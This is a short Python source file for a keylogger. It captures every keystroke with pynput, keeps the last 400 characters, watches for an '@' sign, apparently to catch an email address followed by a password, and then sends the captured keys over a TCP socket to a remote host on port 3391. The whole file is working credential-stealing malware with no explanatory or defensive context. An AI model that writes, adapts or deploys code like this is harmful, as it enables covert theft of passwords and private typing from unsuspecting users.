import socket
from pynput.keyboard import Key, Listener

target_host = ""
target_port = 3391
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def send_data(st):
    client.connect((target_host,target_port))
    client.send(str.encode(st))
    client.close()

wait_for_pass = -1
last_few_keys = '--'
max_chars = 400

def on_press(key):
    global wait_for_pass, last_few_keys

    last_few_keys += str(key)
    
    if str(key)=='\'@\'':
        wait_for_pass += 1
    if wait_for_pass>=0 and wait_for_pass<int(max_chars/2):
        wait_for_pass+=1
    if wait_for_pass>=int(max_chars/2):
        wait_for_pass = -1
        send_data(last_few_keys)
    if len(last_few_keys)>max_chars :
        last_few_keys = last_few_keys[1:]

with Listener(on_press=on_press) as listener:
    listener.join()